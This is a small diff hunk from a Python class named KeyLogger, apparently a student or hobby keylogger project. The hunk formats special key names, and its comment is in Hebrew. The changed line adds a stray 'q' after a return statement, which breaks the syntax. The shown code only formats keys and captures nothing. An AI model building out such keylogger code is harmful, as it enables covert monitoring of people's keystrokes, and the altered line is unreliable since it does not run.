@@ -49,7 +49,7 @@ class KeyLogger(IKeyLogger):
                     key_nise += i
                 key_nise = " " + key_nise + " "
                 if key_nise == " space ":
-                    return " "
+                    return " "q
                 # if key_nise == " enter ":
                 #     return "\n"
                 # זה מוכן למקרה שהרצה לעשות שימוש במקשים מיוחדים
